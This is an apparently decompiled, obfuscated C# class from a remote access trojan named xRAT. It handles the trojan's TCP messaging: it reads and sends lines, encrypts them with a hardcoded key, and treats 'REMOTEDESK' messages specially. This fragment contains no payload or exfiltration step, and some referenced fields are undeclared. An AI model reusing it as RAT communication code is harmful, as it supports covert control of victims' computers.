namespace xRAT
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.IO;
    using System.Net.Sockets;
    using System.Runtime.CompilerServices;

    public class Connection
    {
        private string string_0;
        private TcpClient tcpClient_0;

        public event DisconnectedEventHandler Disconnected;

        public event GotInfoEventHandler GotInfo;

        public Connection(TcpClient client)
        {
            Class1.QaIGh5M7cuigS();
            this.tcpClient_0 = client;
            client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, new AsyncCallback(this.Read), null);
            this.string_0 = client.Client.RemoteEndPoint.ToString().Remove(client.Client.RemoteEndPoint.ToString().LastIndexOf(":"));
        }

        public void Read(IAsyncResult ar)
        {
            try
            {
                string str = new StreamReader(this.tcpClient_0.GetStream()).ReadLine();
                if (!str.StartsWith("REMOTEDESK"))
                {
                    str = Conversions.ToString(Class6.smethod_1("KeYaEs11", str));
                }
                GotInfoEventHandler handler = this.gotInfoEventHandler_0;
                if (handler != null)
                {
                    handler(this, str);
                }
                this.tcpClient_0.GetStream().BeginRead(new byte[] { 0 }, 0, 0, new AsyncCallback(this.Read), null);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                DisconnectedEventHandler handler2 = this.disconnectedEventHandler_0;
                if (handler2 != null)
                {
                    handler2(this);
                }
                ProjectData.ClearProjectError();
            }
        }

        public void Send(string Message)
        {
            try
            {
                StreamWriter writer = new StreamWriter(this.tcpClient_0.GetStream());
                Message = Conversions.ToString(Class6.smethod_0("KeYaEs11", Message));
                writer.WriteLine(Message);
                writer.Flush();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                Console.WriteLine(exception.Message);
                ProjectData.ClearProjectError();
            }
        }

        public object Object_0
        {
            get
            {
                return this.string_0;
            }
        }

        public delegate void DisconnectedEventHandler(Connection client);

        public delegate void GotInfoEventHandler(Connection client, string Message);
    }
}

